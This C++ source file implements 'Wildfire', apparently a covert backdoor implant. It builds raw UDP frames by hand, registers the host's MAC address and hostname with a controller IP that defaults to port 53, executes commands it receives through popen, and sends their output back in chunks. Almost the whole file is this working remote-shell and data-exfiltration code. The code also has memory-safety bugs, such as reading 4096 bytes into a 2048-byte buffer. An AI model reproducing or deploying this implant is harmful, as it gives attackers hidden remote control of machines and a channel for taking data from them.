#include "wildfire.h"

// Constructor
Wildfire::Wildfire(std::string dst_ip, int dst_port, bool DEBUG, bool PROMISC) {
  this->dst_port = dst_port;

  // get a random src port [32768, 61000]
  std::random_device dev;
  std::mt19937 rng(dev());
  std::uniform_int_distribution<std::mt19937::result_type> dist6(32768,61000);
  this->src_port = dist6(rng);
  this->DEBUG = DEBUG;
  this->PROMISC = PROMISC;
  this->destination_ip = inet_addr(dst_ip.c_str());

  memset(this->iface, '\0', sizeof(this->iface));
  this->GetInterfaceName(this->iface);
}

void Wildfire::OpenSocket(){
 /* BPF code generated with tcpdump -dd udp and port 12345
   * used to filter incoming packets at the socket level
   */
  struct sock_filter bpf_code[] = {
      { 0x28, 0, 0, 0x0000000c },
      { 0x15, 0, 6, 0x000086dd },
      { 0x30, 0, 0, 0x00000014 },
      { 0x15, 0, 15, 0x00000011 },
      { 0x28, 0, 0, 0x00000036 },
      { 0x15, 12, 0, 0x00003039 }, //5
      { 0x28, 0, 0, 0x00000038 },
      { 0x15, 10, 11, 0x00003039 }, //7
      { 0x15, 0, 10, 0x00000800 },
      { 0x30, 0, 0, 0x00000017 },
      { 0x15, 0, 8, 0x00000011 },
      { 0x28, 0, 0, 0x00000014 },
      { 0x45, 6, 0, 0x00001fff },
      { 0xb1, 0, 0, 0x0000000e },
      { 0x48, 0, 0, 0x0000000e },
      { 0x15, 2, 0, 0x00003039 }, //15
      { 0x48, 0, 0, 0x00000010 },
      { 0x15, 0, 1, 0x00003039 }, //17
      { 0x6, 0, 0, 0x0000ffff },
      { 0x6, 0, 0, 0x00000000 },
  };

  bpf_code[5].k = this->src_port;
  bpf_code[7].k = this->src_port;
  bpf_code[15].k = this->src_port;
  bpf_code[17].k = this->src_port;

  /* startup a raw socket, gets raw ethernet frames containing IP packets
   * directly from the interface, none of this AF_INET shit
   */
  this->sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
  if (this->sockfd < 0){
      if (this->DEBUG) std::perror("socket");
      exit(1);
  }

  /* setup ifreq struct make sure we can
   * issue an ioctl to the interface
   */
  this->sifreq = (ifreq *)malloc(sizeof(struct ifreq));
  // std::signal(SIGINT, this->Sigint);
  std::strncpy(this->sifreq->ifr_name, this->iface, IFNAMSIZ);
  if (ioctl(this->sockfd, SIOCGIFFLAGS, this->sifreq) == -1){
      if (this->DEBUG) std::perror("ioctl SIOCGIFFLAGS");
      close(this->sockfd);
      free(this->sifreq);
      exit(0);
  }

  //set up promisc mode if enabled
  if (this->PROMISC){
      this->sifreq->ifr_flags |= IFF_PROMISC;
      if (ioctl(this->sockfd, SIOCSIFFLAGS, this->sifreq) == -1)
          if (this->DEBUG) std::perror("ioctl SIOCSIFFLAGS");
  }

  //apply the packet filter code to the socket
  this->filter.len = 20;
  this->filter.filter = bpf_code;
  if (setsockopt(this->sockfd, SOL_SOCKET, SO_ATTACH_FILTER,
                 &(this->filter), sizeof(this->filter)) < 0)
      if (this->DEBUG) std::perror("setsockopt");
}

void Wildfire::CloseSocket(){
  //if promiscuous mode was on, turn it off
  if (Wildfire::Instance->PROMISC){
      if (ioctl(Wildfire::Instance->sockfd, SIOCGIFFLAGS, Wildfire::Instance->sifreq) == -1){
          if (Wildfire::Instance->DEBUG) std::perror("ioctl GIFFLAGS");
      }
      Wildfire::Instance->sifreq->ifr_flags ^= IFF_PROMISC;
      if (ioctl(Wildfire::Instance->sockfd, SIOCSIFFLAGS, Wildfire::Instance->sifreq) == -1){
          if (Wildfire::Instance->DEBUG) std::perror("ioctl SIFFLAGS");
      }
  }
  //shut it down!
  free(Wildfire::Instance->sifreq);
  close(Wildfire::Instance->sockfd);
}

// Null, because instance will be initialized on demand.
Wildfire* Wildfire::Instance = NULL;

Wildfire *Wildfire::Init(std::string dst_ip){
  return Wildfire::Init(dst_ip, 53, false, false);
}

Wildfire *Wildfire::Init(std::string dst_ip, int dst_port){
  return Wildfire::Init(dst_ip, dst_port, false, false);
}

Wildfire *Wildfire::Init(std::string dst_ip, int dst_port, bool DEBUG){
  return Wildfire::Init(dst_ip, dst_port, DEBUG, false);
}

Wildfire *Wildfire::Init(std::string dst_ip, int dst_port, bool DEBUG, bool PROMISC){
  if (Wildfire::Instance == NULL){
    // setup singleton
    Wildfire::Instance = new Wildfire(dst_ip, dst_port, DEBUG, PROMISC);
    // figure out gateway mac
    Wildfire::Instance->SetGatewayMAC();
    // set the interface MAC
    Wildfire::Instance->SetInterfaceMac();
    // setup SIGINT handler
    std::signal(SIGINT, Wildfire::StaticSignalHandler);
  }
  return Wildfire::Instance;
}

std::string Wildfire::GetHostname(){
  char hostname[128];
  gethostname(hostname, 128);
  std::string name(hostname);
  return name;
}

void Wildfire::Register(){
  char * uc_Mac = (char *)malloc(18*sizeof(char));
  sprintf((char *)uc_Mac,(const char *)"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x",
                            this->interface_mac[0], this->interface_mac[1],
                            this->interface_mac[2], this->interface_mac[3],
                            this->interface_mac[4], this->interface_mac[5]);
  std::string mac = std::string(reinterpret_cast<const char*>(uc_Mac));
  this->SendChunk(mac + std::string{"|"} + Wildfire::GetHostname());
}

void Wildfire::End(){
  delete Wildfire::Instance;
}

std::string Wildfire::ListenOnce(){
  int n;
  unsigned char buf[2048];
  char *udpdata;
  struct iphdr *ip;
  struct udphdr *udp;


  memset(buf, 0, 2048);
  //get a packet, and tear it apart, look for keywords
  n = recvfrom(Wildfire::Instance->sockfd, buf, 4096, 0, NULL, NULL);
  ip = (struct iphdr *)(buf + sizeof(struct ethhdr));
  udp = (struct udphdr *)(buf + ip->ihl*4 + sizeof(struct ethhdr));
  return std::string(reinterpret_cast<const char*>(((buf + ip->ihl*4 + 8 + sizeof(struct ethhdr)))));
}

void Wildfire::Run(){
  while(true){
    Wildfire::RunOnce();
  }
}

void Wildfire::RunOnce() {
  std::string payload = Wildfire::Instance->ListenOnce();

  std::cout << payload << "\n";

  //checkup on the service, make sure it is still there
  int pipe_index = payload.find("|");
  std::string uuid = payload.substr(0, pipe_index+1); // and pipe ;)
  std::string command = payload.substr(pipe_index+1, payload.size());

  int out = open("/dev/null", O_WRONLY);
  int err = open("/dev/null", O_WRONLY);
  dup2(out, 0);
  dup2(err, 2);

  FILE *fd;
  fd = popen(command.c_str(), "r");

  char buffer[256];
  size_t chread;
  /* String to store entire command contents in */
  size_t comalloc = 256;
  size_t comlen   = 0;
  unsigned char *comout   = (unsigned char *)malloc(comalloc);

  /* Use fread so binary data is dealt with correctly */
  while ((chread = fread(buffer, 1, sizeof(buffer), fd)) != 0) {
    if (comlen + chread >= comalloc) {
      comalloc *= 2;
      comout = (unsigned char *)realloc(comout, comalloc);
    }
    memmove(comout + comlen, buffer, chread);
    comlen += chread;
  }

  pclose(fd);
  std::string cmdOutStr(reinterpret_cast<char*>((comout)));
  std::string response = (uuid+cmdOutStr).substr(0, (uuid+cmdOutStr).size()-6);
  Wildfire::Instance->Send(response);
}

void Wildfire::Send(std::string payload){
  int i = 0;
  std::string chunk;
  while(i < payload.size()){
    int offset =  (i+1024) < payload.size() ? 1024 : payload.size()-i;
    chunk = payload.substr(i, offset);
    this->SendChunk(chunk);
    i += 1024;
  }
}

void Wildfire::GetMacFromIP(char *ip_addr){
  std::ifstream arp_file("/proc/net/arp", std::ifstream::in);
  std::regex mac_regex(std::string("^") + ip_addr + std::string("\\s*\\w*\\s*\\w*\\s*([\\w:]*)"));

  // skip first line
  arp_file.ignore ( std::numeric_limits<std::streamsize>::max(), '\n' );
  std::string line;
  while(getline( arp_file, line )){
    std::smatch mac_match;
    if(std::regex_search(line, mac_match, mac_regex)) {
      std::string mac_str = mac_match[1];
      std::sscanf(mac_str.c_str(),
                      "%02x:%02x:%02x:%02x:%02x:%02x",
                      (unsigned int*)(&this->gateway_mac[0]),
                      (unsigned int*)(&this->gateway_mac[1]),
                      (unsigned int*)(&this->gateway_mac[2]),
                      (unsigned int*)(&this->gateway_mac[3]),
                      (unsigned int*)(&this->gateway_mac[4]),
                      (unsigned int*)(&this->gateway_mac[5]));
    }
  }
}

void Wildfire::SetGatewayMAC(){
  std::ifstream route_file("/proc/net/route", std::ifstream::in);
  std::regex route_regex(std::string("^") + this->iface + std::string("\\s*00000000\\s*([A-Z0-9]{8})"));
  // skip first line
  route_file.ignore ( std::numeric_limits<std::streamsize>::max(), '\n' );
  std::string line;
  while(getline( route_file, line )){
    std::smatch route_match;
    if(std::regex_search(line, route_match, route_regex)) {
      unsigned int ip;
      std::stringstream ss;
      ss << std::hex << route_match[1];
      ss >> ip;
      struct in_addr addr;
      addr.s_addr = htonl(ip);
      /* Reverse the bytes in the binary address */
      addr.s_addr =
        ((addr.s_addr & 0xff000000) >> 24) |
        ((addr.s_addr & 0x00ff0000) >>  8) |
        ((addr.s_addr & 0x0000ff00) <<  8) |
        ((addr.s_addr & 0x000000ff) << 24);
      char *ip_addr = inet_ntoa(addr);
      this->GetMacFromIP(ip_addr);
    }
  }
}

void Wildfire::GetInterfaceName(char iface[]){
  int sock, err;

  char buf[32];
  char buffer[100];

  struct ifaddrs *addrs, *iap;
  struct sockaddr_in *sa;
  struct sockaddr_in serv;
  struct sockaddr_in name;



  sock = socket(AF_INET, SOCK_DGRAM, 0);

  memset(&serv, 0, sizeof(serv));
  serv.sin_family = AF_INET;
  serv.sin_addr.s_addr = this->destination_ip;
  serv.sin_port = htons(this->dst_port);

  err = connect(sock ,(const struct sockaddr*) &serv ,sizeof(serv));


  socklen_t namelen = sizeof(name);
  err = getsockname(sock, (struct sockaddr*) &name, &namelen);


  const char* p = inet_ntop(AF_INET, &name.sin_addr, buffer, 100);

  getifaddrs(&addrs);
  for (iap = addrs; iap != NULL; iap = iap->ifa_next) {
      if (iap->ifa_addr && (iap->ifa_flags & IFF_UP) && iap->ifa_addr->sa_family == AF_INET) {
          sa = (struct sockaddr_in *)(iap->ifa_addr);
          inet_ntop(iap->ifa_addr->sa_family, (void *)&(sa->sin_addr), buf, sizeof(buf));
          if (!strcmp(p, buf)) {
            this->interface_ip = sa->sin_addr.s_addr;
            strncpy(iface, iap->ifa_name, strlen(iap->ifa_name));
            break;
          }
      }
  }

  freeifaddrs(addrs);
  close(sock);
}

void Wildfire::SetInterfaceMac(){
  int fd;
  struct ifreq ifr;

  fd = socket(AF_INET, SOCK_DGRAM, 0);

  ifr.ifr_addr.sa_family = AF_INET;
  strncpy((char *)ifr.ifr_name , (const char *)this->iface , IFNAMSIZ-1);

  int ret = ioctl(fd, SIOCGIFHWADDR, &ifr);

  close(fd);

  for (int i = 0; i < ETH_ALEN; i++){
    this->interface_mac[i] = (unsigned char)ifr.ifr_hwaddr.sa_data[i];
  }
}

void Wildfire::SendChunk(std::string chunk){
  struct udpframe frame;
  struct sockaddr_ll saddrll;
  struct sockaddr_in sin;
  int len;

  size_t chunk_size = chunk.size();

  // do stuff with chunk
  //setup the data
  std::memset(&frame, 0, sizeof(frame));
  chunk.copy((char*)frame.data, chunk_size);
  //std::strncpy((char*)frame.data, chunk.c_str(), chunk.size());

  //get the ifindex
  if (ioctl(this->sockfd, SIOCGIFINDEX, this->sifreq) == -1){
    if (this->DEBUG){
      std::perror("ioctl SIOCGIFINDEX");
    }
    return;
  }

  //layer 2
  saddrll.sll_family = PF_PACKET;
  saddrll.sll_ifindex = this->sifreq->ifr_ifindex;
  saddrll.sll_halen = ETH_ALEN;
  std::memcpy((void*)saddrll.sll_addr, static_cast<void *>(&(this->gateway_mac)), ETH_ALEN);
  std::memcpy((void*)frame.ehdr.h_source, static_cast<void *>(&(this->interface_mac)), ETH_ALEN);
  std::memcpy((void*)frame.ehdr.h_dest, static_cast<void *>(&(this->gateway_mac)), ETH_ALEN);
  frame.ehdr.h_proto = htons(ETH_P_IP);

  //layer 3
  frame.ip.version = 4;
  frame.ip.ihl = sizeof(frame.ip)/4;
  frame.ip.id = htons(69);
  frame.ip.frag_off |= htons(IP_DF);
  frame.ip.ttl = 64;
  frame.ip.tos = 0;
  frame.ip.tot_len = htons(sizeof(frame.ip) + sizeof(frame.udp) + chunk_size);
  frame.ip.saddr = this->interface_ip;
  frame.ip.daddr = this->destination_ip;
  frame.ip.protocol = IPPROTO_UDP;

  //layer 4
  frame.udp.source = htons(this->src_port);
  frame.udp.dest = htons(this->dst_port);
  frame.udp.len = htons(chunk_size + sizeof(frame.udp));

  //checksumsstrncpy
  //udp_checksum(&frame.ip, (unsigned short*)&frame.udp);
  this->CalcIPChecksum(&frame.ip);

  //calculate total length and send
  len = sizeof(struct ethhdr) + sizeof(struct udphdr) + sizeof(struct iphdr) + chunk_size;
  sendto(this->sockfd, (char*)&frame, len, 0, (struct sockaddr *)&saddrll, sizeof(saddrll));
}

void Wildfire::CalcIPChecksum(struct iphdr *ip){
  unsigned int count = ip->ihl<<2;
  unsigned short *addr = (unsigned short*)ip;
  register unsigned long sum = 0;

  ip->check = 0;
  while (count > 1){
      sum += *addr++;
      count -= 2;
  }
  if (count > 0)
      sum += ((*addr) & htons(0xFFFF));
  while (sum>>16)
      sum = (sum & 0xFFFF) + (sum >>16);
  sum = ~sum;
  ip->check = (unsigned short)sum;
}
